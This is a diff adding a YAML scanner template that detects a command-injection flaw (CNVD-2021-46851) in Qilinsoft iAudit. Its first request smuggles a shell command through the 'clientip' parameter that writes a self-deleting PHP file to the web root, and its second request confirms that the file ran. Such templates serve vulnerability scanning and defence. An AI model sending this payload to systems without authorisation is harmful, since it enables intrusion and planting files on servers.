@@ -1,0 +1,38 @@
+id: CNVD-2021-46851
+info:
+  name: Qilinsoft iAudit Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Vulnerability in Qilinsoft iAudit allowing command injection via crafted HTTP requests.
+  reference:
+    - https://yun.scdsjzx.cn/system/notice/detail/399d2dd0-94aa-4914-a8f6-e71f8dc8ac87
+
+variables:
+  r2: "{{rand_text_alpha(10)}}"
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/get_luser_by_sshport.php?clientip=1;echo \"<?php echo md5({{r2}});unlink(__FILE__);?>\">/opt/freesvr/web/htdocs/freesvr/audit/{{r2}}.php;&clientport=1"
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/{{r2}}.php"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r2)}}"
+        part: body
